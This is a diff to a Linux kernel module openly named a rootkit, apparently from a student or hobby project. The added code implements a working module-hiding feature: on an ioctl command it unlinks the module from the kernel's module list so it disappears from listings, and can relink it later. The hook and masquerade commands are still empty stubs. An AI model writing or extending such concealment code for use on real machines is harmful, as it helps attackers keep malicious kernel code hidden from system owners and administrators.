@@ -23,7 +23,9 @@ static int major;
 struct cdev *kernel_cdev;
 struct class *class;
 struct device *device;
-dev_t dev_id;
+dev_t dev;
+bool is_hidden;
+struct list_head *prev;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
@@ -49,9 +51,16 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 	case IOCTL_MOD_HOOK:
 		//do something
 		break;
-	case IOCTL_MOD_HIDE:
-		//do something
+	case IOCTL_MOD_HIDE: {
+		if (is_hidden) {
+			list_add(&THIS_MODULE->list, prev);
+			is_hidden = false;
+		} else {
+			list_del_init(&THIS_MODULE->list);
+			is_hidden = true;
+		}
 		break;
+	}
 	case IOCTL_MOD_MASQ:
 		//do something
 		break;
@@ -75,7 +84,7 @@ struct file_operations fops = {
 static int __init rootkit_init(void)
 {
 	int ret;
-	dev_t dev_no, dev;
+	dev_t dev_no;
 
 	kernel_cdev = cdev_alloc();
 	kernel_cdev->ops = &fops;
@@ -89,7 +98,6 @@ static int __init rootkit_init(void)
 
 	major = MAJOR(dev_no);
 	dev = MKDEV(major, 0);
-	dev_id = dev;
 	printk("The major number for your device is %d\n", major);
 	ret = cdev_add(kernel_cdev, dev, 1);
 	if (ret < 0) {
@@ -110,6 +118,11 @@ static int __init rootkit_init(void)
 		ret = PTR_ERR(device);
 		goto err_device;
 	}
+
+	// for hiding module
+	is_hidden = false;
+	prev = THIS_MODULE->list.prev;
+
 	return 0;
 
 err_device:
@@ -130,9 +143,9 @@ static void __exit rootkit_exit(void)
 	pr_info("%s: removed\n", OURMODNAME);
 	cdev_del(kernel_cdev);
 	// XXX: this should be major or dev?
-	unregister_chrdev_region(major, 1);
+	unregister_chrdev_region(dev, 1);
 
-	device_destroy(class, dev_id);
+	device_destroy(class, dev);
 
 	class_destroy(class);
 
